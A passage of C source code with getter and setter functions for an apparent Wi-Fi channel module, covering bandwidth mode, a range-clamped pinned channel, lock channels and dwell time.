    s.bw40 = on ? 1 : 0;
}

int wicoll_bw40(void) {
    return s.bw40;
}

void wicoll_set_pinned(uint8_t ch) {
    if (ch < WICOL_CH_MIN) {
        ch = WICOL_CH_MIN;
    }
    if (ch > WICOL_CH_MAX) {
        ch = WICOL_CH_MAX;
    }
    s.pinned_ch = ch;
}

uint8_t wicoll_pinned(void) {
    return s.pinned_ch;
}

uint8_t wicoll_hot_lock_channel(void) {
    return s.hot_lock_ch;
}

uint8_t wicoll_lock_channel(void) {
    return s.lock_ch;
}

uint8_t wicoll_lock_ap_channels(void) {
    return s.lock_ap_ch;
}

uint32_t wicoll_hot_dwell_ms(void) {
    return s.hot_dwell_total;
}